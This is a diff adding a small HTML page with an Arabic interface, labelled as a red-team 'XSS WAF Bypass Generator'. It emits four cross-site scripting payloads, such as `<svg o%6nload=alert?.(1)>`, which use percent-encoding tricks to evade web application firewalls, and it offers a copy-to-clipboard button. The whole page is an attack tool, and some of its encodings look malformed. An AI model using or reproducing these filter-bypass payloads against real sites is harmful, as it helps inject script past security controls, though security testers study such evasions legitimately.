@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS WAF Bypass Generator</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #0d1117;
+      color: #c9d1d9;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #161b22;
+      padding: 20px;
+      text-align: center;
+    }
+
+    main {
+      padding: 20px;
+      max-width: 800px;
+      margin: auto;
+    }
+
+    select, button {
+      padding: 10px;
+      margin: 10px 0;
+      background-color: #21262d;
+      color: #c9d1d9;
+      border: 1px solid #30363d;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    select:hover, button:hover {
+      background-color: #30363d;
+    }
+
+    .output {
+      background-color: #161b22;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    pre {
+      background: #0d1117;
+      padding: 10px;
+      border: 1px solid #30363d;
+      border-radius: 5px;
+      overflow-x: auto;
+    }
+
+    footer {
+      text-align: center;
+      padding: 15px;
+      color: #8b949e;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>🧪 XSS Hex Overflow Generator</h1>
+    <p>Bypass WAF using encoding tricks (Inspired by SMHTahsin33)</p>
+  </header>
+
+  <main>
+    <label for="payloadType">اختر نوع البايلود:</label><br>
+    <select id="payloadType">
+      <option value="equal">تجاوز علامة =</option>
+      <option value="onload">تجاوز onload</option>
+      <option value="alert">تجاوز alert()</option>
+      <option value="full">بايلود SVG كامل</option>
+    </select><br>
+
+    <button onclick="generate()">🔄 توليد البايلود</button>
+
+    <div class="output">
+      <h2>📦 البايلود الناتج:</h2>
+      <pre id="result">&lt;اختر نوع البايلود</pre>
+      <button onclick="copy()">📋 نسخ إلى الحافظة</button>
+    </div>
+  </main>
+
+  <footer>
+    &copy; 2025 | RedTeam Tools | جميع الحقوق محفوظة
+  </footer>
+
+  <script>
+    function generate() {
+      const type = document.getElementById("payloadType").value;
+      let payload = "";
+
+      switch (type) {
+        case "equal":
+          payload = `<svg onload%jdonload=alert?.(1)>`;
+          break;
+        case "onload":
+          payload = `<svg o%6nload=alert?.(1)>`;
+          break;
+        case "alert":
+          payload = `<svg onload=al%7ert?.()>`;
+          break;
+        case "full":
+          payload = `<svg onload%w==alert?.(1)>`;
+          break;
+        default:
+          payload = `اختر نوع البايلود أولاً`;
+      }
+
+      document.getElementById("result").textContent = payload;
+    }
+
+    function copy() {
+      const text = document.getElementById("result").textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("✅ تم نسخ البايلود");
+      }, () => {
+        alert("❌ حدث خطأ أثناء النسخ");
+      });
+    }
+  </script>
+</body>
+</html>
